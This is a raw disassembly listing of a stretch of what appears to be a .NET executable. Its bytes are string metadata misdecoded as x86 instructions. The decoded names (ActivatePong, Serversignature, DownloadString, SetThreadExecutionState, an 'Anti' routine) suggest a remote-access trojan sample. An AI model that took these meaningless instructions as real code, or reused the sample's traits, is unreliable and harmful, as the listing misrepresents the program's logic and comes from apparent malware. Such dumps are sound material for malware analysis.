  405e98:	6d                   	insl   (%dx),%es:(%edi)
  405e99:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e9d:	74 5f                	je     0x405efe
  405e9f:	55                   	push   %ebp
  405ea0:	73 65                	jae    0x405f07
  405ea2:	72 4e                	jb     0x405ef2
  405ea4:	61                   	popa
  405ea5:	6d                   	insl   (%dx),%es:(%edi)
  405ea6:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  405eaa:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  405eae:	6f                   	outsl  %ds:(%esi),(%dx)
  405eaf:	73 74                	jae    0x405f25
  405eb1:	4e                   	dec    %esi
  405eb2:	61                   	popa
  405eb3:	6d                   	insl   (%dx),%es:(%edi)
  405eb4:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  405eb8:	6d                   	insl   (%dx),%es:(%edi)
  405eb9:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  405ebe:	65 54                	gs push %esp
  405ec0:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  405ec7:	5f                   	pop    %edi
  405ec8:	4c                   	dec    %esp
  405ec9:	61                   	popa
  405eca:	73 74                	jae    0x405f40
  405ecc:	57                   	push   %edi
  405ecd:	72 69                	jb     0x405f38
  405ecf:	74 65                	je     0x405f36
  405ed1:	54                   	push   %esp
  405ed2:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  405ed9:	6e                   	outsb  %ds:(%esi),(%dx)
  405eda:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  405ee1:	54                   	push   %esp
  405ee2:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  405ee9:	74 65                	je     0x405f50
  405eeb:	4c                   	dec    %esp
  405eec:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  405ef3:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  405ef6:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  405efa:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  405f01:	6d                   	insl   (%dx),%es:(%edi)
  405f02:	65 54                	gs push %esp
  405f04:	79 70                	jns    0x405f76
  405f06:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  405f0a:	6c                   	insb   (%dx),%es:(%edi)
  405f0b:	75 65                	jne    0x405f72
  405f0d:	54                   	push   %esp
  405f0e:	79 70                	jns    0x405f80
  405f10:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  405f14:	6f                   	outsl  %ds:(%esi),(%dx)
  405f15:	74 6f                	je     0x405f86
  405f17:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  405f1a:	54                   	push   %esp
  405f1b:	79 70                	jns    0x405f8d
  405f1d:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405f21:	74 54                	je     0x405f77
  405f23:	79 70                	jns    0x405f95
  405f25:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  405f29:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  405f2c:	74 54                	je     0x405f82
  405f2e:	79 70                	jns    0x405fa0
  405f30:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  405f34:	73 74                	jae    0x405faa
  405f36:	65 6d                	gs insl (%dx),%es:(%edi)
  405f38:	2e 43                	cs inc %ebx
  405f3a:	6f                   	outsl  %ds:(%esi),(%dx)
  405f3b:	72 65                	jb     0x405fa2
  405f3d:	00 53 65             	add    %dl,0x65(%ebx)
  405f40:	72 76                	jb     0x405fb8
  405f42:	65 72 73             	gs jb  0x405fb8
  405f45:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  405f4c:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  405f50:	6f                   	outsl  %ds:(%esi),(%dx)
  405f51:	73 65                	jae    0x405fb8
  405f53:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  405f57:	70 6f                	jo     0x405fc8
  405f59:	73 65                	jae    0x405fc0
  405f5b:	00 53 74             	add    %dl,0x74(%ebx)
  405f5e:	72 52                	jb     0x405fb2
  405f60:	65 76 65             	gs jbe 0x405fc8
  405f63:	72 73                	jb     0x405fd8
  405f65:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  405f69:	30 39                	xor    %bh,(%ecx)
  405f6b:	43                   	inc    %ebx
  405f6c:	65 72 74             	gs jb  0x405fe3
  405f6f:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  405f76:	00 56 61             	add    %dl,0x61(%esi)
  405f79:	6c                   	insb   (%dx),%es:(%edi)
  405f7a:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  405f81:	72 
  405f82:	76 65                	jbe    0x405fe9
  405f84:	72 43                	jb     0x405fc9
  405f86:	65 72 74             	gs jb  0x405ffd
  405f89:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  405f90:	00 63 65             	add    %ah,0x65(%ebx)
  405f93:	72 74                	jb     0x406009
  405f95:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  405f9c:	00 43 72             	add    %al,0x72(%ebx)
  405f9f:	65 61                	gs popa
  405fa1:	74 65                	je     0x406008
  405fa3:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  405fa7:	75 67                	jne    0x406010
  405fa9:	67 65 72 42          	addr16 gs jb 0x405fef
  405fad:	72 6f                	jb     0x40601e
  405faf:	77 73                	ja     0x406024
  405fb1:	61                   	popa
  405fb2:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  405fb6:	74 61                	je     0x406019
  405fb8:	74 65                	je     0x40601f
  405fba:	00 53 65             	add    %dl,0x65(%ebx)
  405fbd:	74 54                	je     0x406013
  405fbf:	68 72 65 61 64       	push   $0x64616572
  405fc4:	45                   	inc    %ebp
  405fc5:	78 65                	js     0x40602c
  405fc7:	63 75 74             	arpl   %esi,0x74(%ebp)
  405fca:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  405fd1:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  405fd6:	65 74 65             	gs je  0x40603e
  405fd9:	00 43 61             	add    %al,0x61(%ebx)
  405fdc:	6c                   	insb   (%dx),%es:(%edi)
  405fdd:	6c                   	insb   (%dx),%es:(%edi)
  405fde:	53                   	push   %ebx
  405fdf:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  405fe6:	74 
  405fe7:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  405feb:	6d                   	insl   (%dx),%es:(%edi)
  405fec:	70 69                	jo     0x406057
  405fee:	6c                   	insb   (%dx),%es:(%edi)
  405fef:	65 72 47             	gs jb  0x406039
  405ff2:	65 6e                	outsb  %gs:(%esi),(%dx)
  405ff4:	65 72 61             	gs jb  0x406058
  405ff7:	74 65                	je     0x40605e
  405ff9:	64 41                	fs inc %ecx
  405ffb:	74 74                	je     0x406071
  405ffd:	72 69                	jb     0x406068
  405fff:	62 75 74             	bound  %esi,0x74(%ebp)
  406002:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  406007:	75 67                	jne    0x406070
  406009:	67 61                	addr16 popa
  40600b:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40600f:	74 74                	je     0x406085
  406011:	72 69                	jb     0x40607c
  406013:	62 75 74             	bound  %esi,0x74(%ebp)
  406016:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40601b:	75 67                	jne    0x406084
  40601d:	67 65 72 42          	addr16 gs jb 0x406063
  406021:	72 6f                	jb     0x406092
  406023:	77 73                	ja     0x406098
  406025:	61                   	popa
  406026:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40602a:	74 74                	je     0x4060a0
  40602c:	72 69                	jb     0x406097
  40602e:	62 75 74             	bound  %esi,0x74(%ebp)
  406031:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  406035:	6d                   	insl   (%dx),%es:(%edi)
  406036:	56                   	push   %esi
  406037:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40603e:	74 74                	je     0x4060b4
  406040:	72 69                	jb     0x4060ab
  406042:	62 75 74             	bound  %esi,0x74(%ebp)
  406045:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406049:	73 65                	jae    0x4060b0
  40604b:	6d                   	insl   (%dx),%es:(%edi)
  40604c:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  406050:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  406057:	72 
  406058:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40605f:	73 73                	jae    0x4060d4
  406061:	65 6d                	gs insl (%dx),%es:(%edi)
  406063:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  406067:	72 61                	jb     0x4060ca
  406069:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40606c:	61                   	popa
  40606d:	72 6b                	jb     0x4060da
  40606f:	41                   	inc    %ecx
  406070:	74 74                	je     0x4060e6
  406072:	72 69                	jb     0x4060dd
  406074:	62 75 74             	bound  %esi,0x74(%ebp)
  406077:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  40607c:	67 65 74 46          	addr16 gs je 0x4060c6
  406080:	72 61                	jb     0x4060e3
  406082:	6d                   	insl   (%dx),%es:(%edi)
  406083:	65 77 6f             	gs ja  0x4060f5
  406086:	72 6b                	jb     0x4060f3
  406088:	41                   	inc    %ecx
  406089:	74 74                	je     0x4060ff
  40608b:	72 69                	jb     0x4060f6
  40608d:	62 75 74             	bound  %esi,0x74(%ebp)
  406090:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406094:	73 65                	jae    0x4060fb
  406096:	6d                   	insl   (%dx),%es:(%edi)
  406097:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  40609b:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4060a2:	69 
  4060a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4060a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4060a5:	41                   	inc    %ecx
  4060a6:	74 74                	je     0x40611c
  4060a8:	72 69                	jb     0x406113
  4060aa:	62 75 74             	bound  %esi,0x74(%ebp)
  4060ad:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4060b1:	73 65                	jae    0x406118
  4060b3:	6d                   	insl   (%dx),%es:(%edi)
  4060b4:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4060b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4060b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4060ba:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4060c0:	74 69                	je     0x40612b
  4060c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4060c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4060c4:	41                   	inc    %ecx
  4060c5:	74 74                	je     0x40613b
  4060c7:	72 69                	jb     0x406132
  4060c9:	62 75 74             	bound  %esi,0x74(%ebp)
  4060cc:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4060d0:	73 65                	jae    0x406137
  4060d2:	6d                   	insl   (%dx),%es:(%edi)
  4060d3:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4060d7:	65 73 63             	gs jae 0x40613d
  4060da:	72 69                	jb     0x406145
  4060dc:	70 74                	jo     0x406152
  4060de:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4060e5:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  4060ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4060ed:	6d                   	insl   (%dx),%es:(%edi)
  4060ee:	70 69                	jo     0x406159
  4060f0:	6c                   	insb   (%dx),%es:(%edi)
  4060f1:	61                   	popa
  4060f2:	74 69                	je     0x40615d
  4060f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4060f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4060f6:	52                   	push   %edx
  4060f7:	65 6c                	gs insb (%dx),%es:(%edi)
  4060f9:	61                   	popa
  4060fa:	78 61                	js     0x40615d
  4060fc:	74 69                	je     0x406167
  4060fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4060ff:	6e                   	outsb  %ds:(%esi),(%dx)
  406100:	73 41                	jae    0x406143
  406102:	74 74                	je     0x406178
  406104:	72 69                	jb     0x40616f
  406106:	62 75 74             	bound  %esi,0x74(%ebp)
  406109:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40610d:	73 65                	jae    0x406174
  40610f:	6d                   	insl   (%dx),%es:(%edi)
  406110:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  406114:	72 6f                	jb     0x406185
  406116:	64 75 63             	fs jne 0x40617c
  406119:	74 41                	je     0x40615c
  40611b:	74 74                	je     0x406191
  40611d:	72 69                	jb     0x406188
  40611f:	62 75 74             	bound  %esi,0x74(%ebp)
  406122:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406126:	73 65                	jae    0x40618d
  406128:	6d                   	insl   (%dx),%es:(%edi)
  406129:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40612d:	6f                   	outsl  %ds:(%esi),(%dx)
  40612e:	70 79                	jo     0x4061a9
  406130:	72 69                	jb     0x40619b
  406132:	67 68 74 41 74 74    	addr16 push $0x74744174
  406138:	72 69                	jb     0x4061a3
  40613a:	62 75 74             	bound  %esi,0x74(%ebp)
  40613d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406141:	73 65                	jae    0x4061a8
  406143:	6d                   	insl   (%dx),%es:(%edi)
  406144:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  406148:	6f                   	outsl  %ds:(%esi),(%dx)
  406149:	6d                   	insl   (%dx),%es:(%edi)
  40614a:	70 61                	jo     0x4061ad
  40614c:	6e                   	outsb  %ds:(%esi),(%dx)
  40614d:	79 41                	jns    0x406190
  40614f:	74 74                	je     0x4061c5
  406151:	72 69                	jb     0x4061bc
  406153:	62 75 74             	bound  %esi,0x74(%ebp)
  406156:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40615a:	6e                   	outsb  %ds:(%esi),(%dx)
  40615b:	74 69                	je     0x4061c6
  40615d:	6d                   	insl   (%dx),%es:(%edi)
  40615e:	65 43                	gs inc %ebx
  406160:	6f                   	outsl  %ds:(%esi),(%dx)
  406161:	6d                   	insl   (%dx),%es:(%edi)
  406162:	70 61                	jo     0x4061c5
  406164:	74 69                	je     0x4061cf
  406166:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  406169:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  406170:	69 
  406171:	62 75 74             	bound  %esi,0x74(%ebp)
  406174:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  406178:	74 5f                	je     0x4061d9
  40617a:	55                   	push   %ebp
  40617b:	73 65                	jae    0x4061e2
  40617d:	53                   	push   %ebx
  40617e:	68 65 6c 6c 45       	push   $0x456c6c65
  406183:	78 65                	js     0x4061ea
  406185:	63 75 74             	arpl   %esi,0x74(%ebp)
  406188:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  40618c:	74 65                	je     0x4061f3
  40618e:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  406192:	65 74 65             	gs je  0x4061fa
  406195:	56                   	push   %esi
  406196:	61                   	popa
  406197:	6c                   	insb   (%dx),%es:(%edi)
  406198:	75 65                	jne    0x4061ff
  40619a:	00 47 65             	add    %al,0x65(%edi)
  40619d:	74 56                	je     0x4061f5
  40619f:	61                   	popa
  4061a0:	6c                   	insb   (%dx),%es:(%edi)
  4061a1:	75 65                	jne    0x406208
  4061a3:	00 53 65             	add    %dl,0x65(%ebx)
  4061a6:	74 56                	je     0x4061fe
  4061a8:	61                   	popa
  4061a9:	6c                   	insb   (%dx),%es:(%edi)
  4061aa:	75 65                	jne    0x406211
  4061ac:	00 76 61             	add    %dh,0x61(%esi)
  4061af:	6c                   	insb   (%dx),%es:(%edi)
  4061b0:	75 65                	jne    0x406217
  4061b2:	00 67 65             	add    %ah,0x65(%edi)
  4061b5:	74 5f                	je     0x406216
  4061b7:	4b                   	dec    %ebx
  4061b8:	65 65 70 41          	gs gs jo 0x4061fd
  4061bc:	6c                   	insb   (%dx),%es:(%edi)
  4061bd:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4061c4:	5f                   	pop    %edi
  4061c5:	4b                   	dec    %ebx
  4061c6:	65 65 70 41          	gs gs jo 0x40620b
  4061ca:	6c                   	insb   (%dx),%es:(%edi)
  4061cb:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  4061d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4061d3:	76 65                	jbe    0x40623a
  4061d5:	00 41 55             	add    %al,0x55(%ecx)
  4061d8:	38 38                	cmp    %bh,(%eax)
  4061da:	41                   	inc    %ecx
  4061db:	50                   	push   %eax
  4061dc:	50                   	push   %eax
  4061dd:	2e 65 78 65          	cs js,pn 0x406246
  4061e1:	00 73 65             	add    %dh,0x65(%ebx)
  4061e4:	74 5f                	je     0x406245
  4061e6:	42                   	inc    %edx
  4061e7:	6c                   	insb   (%dx),%es:(%edi)
  4061e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4061e9:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  4061ec:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  4061f3:	5f                   	pop    %edi
  4061f4:	54                   	push   %esp
  4061f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4061f6:	74 61                	je     0x406259
  4061f8:	6c                   	insb   (%dx),%es:(%edi)
  4061f9:	53                   	push   %ebx
  4061fa:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  406201:	5f                   	pop    %edi
  406202:	48                   	dec    %eax
  406203:	65 61                	gs popa
  406205:	64 65 72 53          	fs gs jb 0x40625c
  406209:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406210:	5f                   	pop    %edi
  406211:	48                   	dec    %eax
  406212:	65 61                	gs popa
  406214:	64 65 72 53          	fs gs jb 0x40626b
  406218:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40621f:	5f                   	pop    %edi
  406220:	53                   	push   %ebx
  406221:	65 6e                	outsb  %gs:(%esi),(%dx)
  406223:	64 42                	fs inc %edx
  406225:	75 66                	jne    0x40628d
  406227:	66 65 72 53          	data16 gs jb 0x40627e
  40622b:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406232:	5f                   	pop    %edi
  406233:	52                   	push   %edx
  406234:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  406238:	76 65                	jbe    0x40629f
  40623a:	42                   	inc    %edx
  40623b:	75 66                	jne    0x4062a3
  40623d:	66 65 72 53          	data16 gs jb 0x406294
  406241:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406248:	5f                   	pop    %edi
  406249:	4b                   	dec    %ebx
  40624a:	65 79 53             	gs jns 0x4062a0
  40624d:	69 7a 65 00 43 72 79 	imul   $0x79724300,0x65(%edx),%edi
  406254:	70 74                	jo     0x4062ca
  406256:	6f                   	outsl  %ds:(%esi),(%dx)
  406257:	43                   	inc    %ebx
  406258:	6f                   	outsl  %ds:(%esi),(%dx)
  406259:	6e                   	outsb  %ds:(%esi),(%dx)
  40625a:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  406260:	74 5f                	je     0x4062c1
  406262:	50                   	push   %eax
  406263:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40626a:	5f                   	pop    %edi
  40626b:	50                   	push   %eax
  40626c:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  406273:	74 65                	je     0x4062da
  406275:	6d                   	insl   (%dx),%es:(%edi)
  406276:	2e 54                	cs push %esp
  406278:	68 72 65 61 64       	push   $0x64616572
  40627d:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  406284:	5f                   	pop    %edi
  406285:	50                   	push   %eax
  406286:	61                   	popa
  406287:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  40628e:	64 64 
  406290:	5f                   	pop    %edi
  406291:	53                   	push   %ebx
  406292:	65 73 73             	gs jae 0x406308
  406295:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40629c:	6e                   	outsb  %ds:(%esi),(%dx)
  40629d:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4062a1:	73 74                	jae    0x406317
  4062a3:	65 6d                	gs insl (%dx),%es:(%edi)
  4062a5:	45                   	inc    %ebp
  4062a6:	76 65                	jbe    0x40630d
  4062a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4062a9:	74 73                	je     0x40631e
  4062ab:	5f                   	pop    %edi
  4062ac:	53                   	push   %ebx
  4062ad:	65 73 73             	gs jae 0x406323
  4062b0:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4062b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4062b8:	67 00 45 6e          	add    %al,0x6e(%di)
  4062bc:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4062bf:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4062c6:	74 65                	je     0x40632d
  4062c8:	6d                   	insl   (%dx),%es:(%edi)
  4062c9:	2e 44                	cs inc %esp
  4062cb:	72 61                	jb     0x40632e
  4062cd:	77 69                	ja     0x406338
  4062cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4062d0:	67 2e 49             	addr16 cs dec %ecx
  4062d3:	6d                   	insl   (%dx),%es:(%edi)
  4062d4:	61                   	popa
  4062d5:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  4062dc:	73 
  4062dd:	74 65                	je     0x406344
  4062df:	6d                   	insl   (%dx),%es:(%edi)
  4062e0:	2e 52                	cs push %edx
  4062e2:	75 6e                	jne    0x406352
  4062e4:	74 69                	je     0x40634f
  4062e6:	6d                   	insl   (%dx),%es:(%edi)
  4062e7:	65 2e 56             	gs cs push %esi
  4062ea:	65 72 73             	gs jb  0x406360
  4062ed:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4062f4:	46                   	inc    %esi
  4062f5:	72 6f                	jb     0x406366
  4062f7:	6d                   	insl   (%dx),%es:(%edi)
  4062f8:	42                   	inc    %edx
  4062f9:	61                   	popa
  4062fa:	73 65                	jae    0x406361
  4062fc:	36 34 53             	ss xor $0x53,%al
  4062ff:	74 72                	je     0x406373
  406301:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  406308:	61                   	popa
  406309:	73 65                	jae    0x406370
  40630b:	36 34 53             	ss xor $0x53,%al
  40630e:	74 72                	je     0x406382
  406310:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  406317:	6e                   	outsb  %ds:(%esi),(%dx)
  406318:	6c                   	insb   (%dx),%es:(%edi)
  406319:	6f                   	outsl  %ds:(%esi),(%dx)
  40631a:	61                   	popa
  40631b:	64 53                	fs push %ebx
  40631d:	74 72                	je     0x406391
  40631f:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  406326:	74 72                	je     0x40639a
  406328:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40632f:	5f                   	pop    %edi
  406330:	41                   	inc    %ecx
  406331:	73 53                	jae    0x406386
  406333:	74 72                	je     0x4063a7
  406335:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40633c:	5f                   	pop    %edi
  40633d:	41                   	inc    %ecx
  40633e:	73 53                	jae    0x406393
  406340:	74 72                	je     0x4063b4
  406342:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  406349:	41                   	inc    %ecx
  40634a:	73 53                	jae    0x40639f
  40634c:	74 72                	je     0x4063c0
  40634e:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  406355:	53                   	push   %ebx
  406356:	74 72                	je     0x4063ca
  406358:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  40635f:	73 74                	jae    0x4063d5
  406361:	72 69                	jb     0x4063cc
  406363:	6e                   	outsb  %ds:(%esi),(%dx)
  406364:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  406368:	73 74                	jae    0x4063de
  40636a:	65 6d                	gs insl (%dx),%es:(%edi)
  40636c:	2e 44                	cs inc %esp
  40636e:	72 61                	jb     0x4063d1
  406370:	77 69                	ja     0x4063db
  406372:	6e                   	outsb  %ds:(%esi),(%dx)
  406373:	67 00 67 65          	add    %ah,0x65(%bx)
  406377:	74 5f                	je     0x4063d8
  406379:	41                   	inc    %ecx
  40637a:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40637e:	61                   	popa
  40637f:	74 65                	je     0x4063e6
  406381:	50                   	push   %eax
  406382:	6f                   	outsl  %ds:(%esi),(%dx)
  406383:	6e                   	outsb  %ds:(%esi),(%dx)
  406384:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  406388:	74 5f                	je     0x4063e9
  40638a:	41                   	inc    %ecx
  40638b:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40638f:	61                   	popa
  406390:	74 65                	je     0x4063f7
  406392:	50                   	push   %eax
  406393:	6f                   	outsl  %ds:(%esi),(%dx)
  406394:	6e                   	outsb  %ds:(%esi),(%dx)
  406395:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  406399:	74 5f                	je     0x4063fa
  40639b:	45                   	inc    %ebp
  40639c:	72 72                	jb     0x406410
  40639e:	6f                   	outsl  %ds:(%esi),(%dx)
  40639f:	72 44                	jb     0x4063e5
  4063a1:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  4063a8:	73 67                	jae    0x406411
  4063aa:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  4063ae:	75 67                	jne    0x406417
  4063b0:	00 43 6f             	add    %al,0x6f(%ebx)
  4063b3:	6d                   	insl   (%dx),%es:(%edi)
  4063b4:	70 75                	jo     0x40642b
  4063b6:	74 65                	je     0x40641d
  4063b8:	48                   	dec    %eax
  4063b9:	61                   	popa
  4063ba:	73 68                	jae    0x406424
  4063bc:	00 73 74             	add    %dh,0x74(%ebx)
  4063bf:	72 54                	jb     0x406415
  4063c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4063c2:	48                   	dec    %eax
  4063c3:	61                   	popa
  4063c4:	73 68                	jae    0x40642e
  4063c6:	00 47 65             	add    %al,0x65(%edi)
  4063c9:	74 48                	je     0x406413
  4063cb:	61                   	popa
  4063cc:	73 68                	jae    0x406436
  4063ce:	00 56 65             	add    %dl,0x65(%esi)
  4063d1:	72 69                	jb     0x40643c
  4063d3:	66 79 48             	data16 jns 0x40641e
  4063d6:	61                   	popa
  4063d7:	73 68                	jae    0x406441
  4063d9:	00 46 6c             	add    %al,0x6c(%esi)
  4063dc:	75 73                	jne    0x406451
  4063de:	68 00 67 65 74       	push   $0x74656700
  4063e3:	5f                   	pop    %edi
  4063e4:	45                   	inc    %ebp
  4063e5:	78 65                	js     0x40644c
  4063e7:	63 75 74             	arpl   %esi,0x74(%ebp)
  4063ea:	61                   	popa
  4063eb:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  4063ef:	61                   	popa
  4063f0:	74 68                	je     0x40645a
  4063f2:	00 47 65             	add    %al,0x65(%edi)
  4063f5:	74 54                	je     0x40644b
  4063f7:	65 6d                	gs insl (%dx),%es:(%edi)
  4063f9:	70 50                	jo     0x40644b
  4063fb:	61                   	popa
  4063fc:	74 68                	je     0x406466
  4063fe:	00 48 6d             	add    %cl,0x6d(%eax)
  406401:	61                   	popa
  406402:	63 53 68             	arpl   %edx,0x68(%ebx)
  406405:	61                   	popa
  406406:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  40640c:	67 74 68             	addr16 je 0x406477
  40640f:	00 67 65             	add    %ah,0x65(%edi)
  406412:	74 5f                	je     0x406473
  406414:	4c                   	dec    %esp
  406415:	65 6e                	outsb  %gs:(%esi),(%dx)
  406417:	67 74 68             	addr16 je 0x406482
  40641a:	00 49 76             	add    %cl,0x76(%ecx)
  40641d:	4c                   	dec    %esp
  40641e:	65 6e                	outsb  %gs:(%esi),(%dx)
  406420:	67 74 68             	addr16 je 0x40648b
  406423:	00 41 75             	add    %al,0x75(%ecx)
  406426:	74 68                	je     0x406490
  406428:	4b                   	dec    %ebx
  406429:	65 79 4c             	gs jns 0x406478
  40642c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40642e:	67 74 68             	addr16 je 0x406499
  406431:	00 55 72             	add    %dl,0x72(%ebp)
  406434:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  40643a:	00 6f 62             	add    %ch,0x62(%edi)
  40643d:	6a 00                	push   $0x0
  40643f:	4d                   	dec    %ebp
